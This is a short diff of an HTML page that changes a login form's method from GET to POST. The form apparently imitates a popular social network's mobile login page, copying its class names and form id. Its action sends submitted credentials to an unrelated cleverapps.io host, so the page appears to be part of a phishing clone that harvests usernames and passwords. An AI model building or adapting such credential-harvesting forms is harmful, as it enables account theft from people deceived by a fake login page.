@@ -298,7 +298,7 @@
                       </div>
                     </div>
                     <form
-                      method="GET"
+                      method="POST"
                       action="http://app-7c778d8c-4546-4dfc-8087-80c5b0144644.cleverapps.io"
                       class="mobile-login-form _9hp- _5spm"
                       id="login_form"
